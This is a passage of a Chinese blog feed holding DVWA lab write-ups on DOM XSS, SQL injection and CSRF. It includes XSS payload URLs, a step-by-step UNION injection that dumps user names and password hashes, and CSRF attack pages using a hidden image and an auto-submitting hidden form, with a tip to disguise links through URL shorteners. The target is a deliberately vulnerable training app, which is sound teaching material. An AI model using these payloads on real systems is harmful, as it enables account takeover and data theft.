class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现使用了白名单，只允许上传的default值为French、English、German、Spanish其中的一个，页面的源代码无变化。<br /><strong>由于 form表单提交的数据时，先经过JS 过滤，再提交到后端PHP。所以注释部分的javascript 代码不会被传到服务器端(也就符合了白名单的要求)。</strong></p><h2 id="42-构造payload"><a class="markdownIt-Anchor" href="#42-构造payload"></a> 4.2 构造payload：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">English #<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">恶意链接为：</span><br><span class="line">http://192.168.124.6/DVWA/vulnerabilities/xss_d/?default=English #<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="43-写入页面后效果如下"><a class="markdownIt-Anchor" href="#43-写入页面后效果如下"></a> 4.3 写入页面后，效果如下：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English%3Cscript%3Ealert(/xss/);%3C/script%3E"</span>&gt;</span>English</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">URLdecode后：</span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"English&lt;script&gt;alert(/xss/);&lt;/script&gt;"</span>&gt;</span>English</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="5-impossible级别"><a class="markdownIt-Anchor" href="#5-impossible级别"></a> 5 Impossible级别</h1><h2 id="51-查看服务器端源代码"><a class="markdownIt-Anchor" href="#51-查看服务器端源代码"></a> 5.1 查看服务器端源代码：</h2><p><img src="https://img-blog.csdnimg.cn/20190909141839246.png" alt="" /></p><p>什么都没有。</p><h2 id="52-查看页面源代码"><a class="markdownIt-Anchor" href="#52-查看页面源代码"></a> 5.2 查看页面源代码：</h2><p><img src="https://img-blog.csdnimg.cn/20190909141939414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>消除了XSS（DOM）。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-SQL注入</title>
      <link href="/2020/02/21/DVWA-SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/21/DVWA-SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-sql注入简介"><a class="markdownIt-Anchor" href="#1-sql注入简介"></a> 1 SQL注入简介</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><p>程序命令没能对用户输入的内容能作出正确的处理，导致执行非预期命令或访问数据。或者说产生注入的原因是接受相关参数未经正确处理直接带入数据库进行查询操作。发起注入攻击需要存在可控参数（数据）提交方式的确认和SQL命令相关点。</p><h1 id="2-手工注入思路"><a class="markdownIt-Anchor" href="#2-手工注入思路"></a> 2 手工注入思路</h1><blockquote><p><strong>1.判断是否存在注入，注入是字符型还是数字型<br />2.猜解SQL查询语句中的字段数<br />3.确定显示的字段顺序<br />4.获取当前数据库<br />5.获取数据库中的表名<br />6.获取表中的字段名<br />7.下载数据</strong></p></blockquote><p>下面对四种级别的代码进行分析。</p><h1 id="3-low级别"><a class="markdownIt-Anchor" href="#3-low级别"></a> 3 Low级别</h1><ul><li>查看服务器端源代码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$id = $_REQUEST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check database</span></span><br><span class="line">$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get results</span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line"><span class="comment">// Get values</span></span><br><span class="line">$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for end user</span></span><br><span class="line">$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p><h2 id="31-判断是否存在注入注入是字符型还是数字型"><a class="markdownIt-Anchor" href="#31-判断是否存在注入注入是字符型还是数字型"></a> 3.1 判断是否存在注入，注入是字符型还是数字型</h2><ul><li><p><strong>SQL语句可以用#和-- 来进行注释（注意-- 后必须有空格）。</strong></p></li><li><p><strong>在输入框中直接提交时，可以在输入末尾加#来注释后面的内容。但是不能用-- ，因为-- 后不能输入空格。</strong></p></li><li><p><strong>用hack bar进行调试时，可以在输入末尾加-- 来注释后面的内容。但是不能用#，因为#会注释掉URL后面的submit。</strong></p></li><li><p><strong>下面我们均用hack bar进行测试</strong></p><p>hack bar中输入|<code>http://192.168.124.6/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</code>|，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911193136118.png" alt="" /></p><p><strong>下面我们仅阐述’?‘和’&amp;'之间id内容的变化。</strong></p><p>输入id=1’ and 1=2 --，查询失败：</p><p><img src="https://img-blog.csdnimg.cn/20190911193511423.png" alt="" /></p><p>输入id=1’ and 1=1 --（-- 可以注释掉SQL语句后面的单引号），查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911203422890.png" alt="" /></p><p><strong>说明存在SQL注入，且注入类型位字符型注入。</strong></p></li></ul><h2 id="32-猜解sql查询语句中的字段数"><a class="markdownIt-Anchor" href="#32-猜解sql查询语句中的字段数"></a> 3.2 猜解SQL查询语句中的字段数</h2><p>输入id=1′ or 1=1 order by 1 --，查询成功。</p><p><img src="https://img-blog.csdnimg.cn/20190911200107439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>输入id=1′ or 1=1 order by 2 --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911200128871.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>输入id=1′ or 1=1 order by 3 --，查询失败：</p><p><img src="https://img-blog.csdnimg.cn/20190911200151787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p><strong>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。（这里也可以通过输入union select 1,2,3…来猜解字段数）</strong></p><h2 id="33-确定显示的字段顺序"><a class="markdownIt-Anchor" href="#33-确定显示的字段顺序"></a> 3.3 确定显示的字段顺序</h2><p>输入id=1’ union select 1,2 --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911203751397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>说明执行的SQL语句为select First name,Surname from TABLE where ID=’id’…</p><h2 id="34-获取当前数据库"><a class="markdownIt-Anchor" href="#34-获取当前数据库"></a> 3.4 获取当前数据库</h2><p>输入id=1’ union select 1,database() --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911203847257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>说明当前的数据库为dvwa。</p><h2 id="35-获取数据库中的表名"><a class="markdownIt-Anchor" href="#35-获取数据库中的表名"></a> 3.5 获取数据库中的表名</h2><blockquote><p>information_schema 看作是一个信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。<br />对表的meta data的查询需要使用information_schema.tables；对列的meta data的查询需要使用information_schema.columns；<br />table_schema是数据库的名称，table_name是具体的表名，table_type指的是表的类型；column_name是列名</p></blockquote><p>输入id=1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911204343657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>dvwa数据库中有两个表：guestbook和users。</p><h2 id="36-获取表中的字段名"><a class="markdownIt-Anchor" href="#36-获取表中的字段名"></a> 3.6 获取表中的字段名</h2><p>输入id=1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=‘users’ --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911204953626.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>说明users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p><h2 id="37-下载数据"><a class="markdownIt-Anchor" href="#37-下载数据"></a> 3.7 下载数据</h2><p>输入id=1’ union select group_concat(user_id,first_name,last_name),group_concat(password) from users --，查询成功：</p><p><img src="https://img-blog.csdnimg.cn/20190911205352896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><h1 id="4-medium级别"><a class="markdownIt-Anchor" href="#4-medium级别"></a> 4 Medium级别</h1><p>Medium不知为何运行不了了，后续再更吧。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA-CSRF</title>
      <link href="/2020/02/21/DVWA-CSRF/"/>
      <url>/2020/02/21/DVWA-CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="1-csrf介绍"><a class="markdownIt-Anchor" href="#1-csrf介绍"></a> 1 CSRF介绍</h1><p>CSRF，全称Cross-site request forgery，即跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作。</p><p>可以这样理解CSRF：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p><h1 id="2-low-security-level"><a class="markdownIt-Anchor" href="#2-low-security-level"></a> 2 Low Security Level</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>服务器通过GET方式接收修改密码的请求，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，没有任何的防CSRF机制（当然服务器对请求的发送者是做了身份验证的，是检查的cookie，只是这里的代码没有体现）。</p><h2 id="21-构造如下链接"><a class="markdownIt-Anchor" href="#21-构造如下链接"></a> 2.1 构造如下链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.dvwa.com&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new&#x3D;test&amp;password_conf&#x3D;test&amp;Change&#x3D;Change#</span><br></pre></td></tr></table></figure><p>当受害者点击了这个链接，密码就会被改成test</p><h2 id="22-使用短链接来隐藏-url"><a class="markdownIt-Anchor" href="#22-使用短链接来隐藏-url"></a> 2.2 使用短链接来隐藏 URL</h2><p>为了更加隐蔽，可以生成短网址链接，点击短链接，会自动跳转到真实网站：</p><p><strong>PS:提供一个<a href="http://tinyurl.com/yd2gogtv" target="_blank" rel="noopener">短网址生成网站</a></strong></p><h2 id="23-构造攻击页面"><a class="markdownIt-Anchor" href="#23-构造攻击页面"></a> 2.3 构造攻击页面</h2><h3 id="231-方式-1"><a class="markdownIt-Anchor" href="#231-方式-1"></a> 2.3.1 方式 1</h3><p>通过img标签中的src属性来加载CSRF攻击利用的URL，并进行布局隐藏，实现了受害者点击链接则会将密码修改。</p><p>构造的页面test.html如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.dvwa.com/vulnerabilities/csrf/?password_new=test&amp;password_conf=test&amp;Change=Change#"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将test.html文件放在攻击者自己准备的网站上：</p><p><img src="https://img-blog.csdnimg.cn/20190916195321212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>当受害者正在使用自己的网站（浏览器中还保存着session值）时，访问攻击者诱惑点击的此链接:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.hack.com&#x2F;test.html</span><br></pre></td></tr></table></figure><p>误认为是自己点击的是一个失效的url：</p><p><img src="https://img-blog.csdnimg.cn/20190916195409447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>但实际上已经遭受了CSRF攻击，密码已经被修改为test</p><p>我们将访问test.html时的数据包抓下来：</p><p><img src="https://img-blog.csdnimg.cn/20190916195434409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h3 id="232-方式-2"><a class="markdownIt-Anchor" href="#232-方式-2"></a> 2.3.2 方式 2</h3><p>查看页面html源代码，将关于密码操作的表单部分，通过javascript的onload事件加载和css代码来隐藏布局，按GET传递参数的方式，进一步构造html form表单，实现了受害者点击链接则会将密码修改。</p><p><img src="https://img-blog.csdnimg.cn/20190916195533143.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>构造的页面dvwa.html如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"javascript:csrf()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">csrf</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">"button"</span>).click();</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">form&#123;</span><br><span class="line"><span class="css"><span class="selector-tag">display</span><span class="selector-pseudo">:none</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://www.dvwa.com/vulnerabilities/csrf/?"</span> <span class="attr">method</span>=<span class="string">"GET"</span>&gt;</span></span><br><span class="line">        New password:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">"off"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        Confirm new password:<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">AUTOCOMPLETE</span>=<span class="string">"off"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">id</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当受害者正在使用自己的网站（浏览器中还保存着session值）时，访问攻击者诱惑点击的此链接:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.hack.com&#x2F;dvwa.html</span><br></pre></td></tr></table></figure><h1 id="3-medium-security-level"><a class="markdownIt-Anchor" href="#3-medium-security-level"></a> 3 Medium Security Level</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">        $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相关函数介绍：</p><p><kbd>stripos()函数：</kbd></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stripos(string,find,start)</span><br></pre></td></tr></table></figure><blockquote><p><strong>stripos()函数查找字符串在另一字符串中第一次出现的位置,不区分大小写。<br />PHP超全局变量<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">两</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">：</mi></mrow><annotation encoding="application/x-tex">_SERVER中的两个值：</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">：</span></span></span></span>_SERVER[‘HTTP_REFERER’]：PHP中获取链接到当前页面的前一页面的url链接地址，即HTTP数据包中的Referer参数的值。<br />$_SERVER[‘SERVER_NAME’]：PHP中获取服务器主机的名称，即HTTP数据包中的Host参数的值。<br />用户正常登录使用修改密码操作时，可以看到：</strong></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190916195840151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>Medium Security Level的代码使用stripos()函数检查HTTP头，过滤规则是|<code>$_SERVER['HTTP_REFERER']</code>|的值中必须包含|<code>$_SERVER['SERVER_NAME']</code>|，以此来抵御CSRF攻击。</p><h2 id="31-exploit"><a class="markdownIt-Anchor" href="#31-exploit"></a> 3.1 Exploit</h2><p>将Low Security Level第三种方法中的攻击页面test.html复制一份，命名为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.dvwa.com.html：</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190916200151702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" 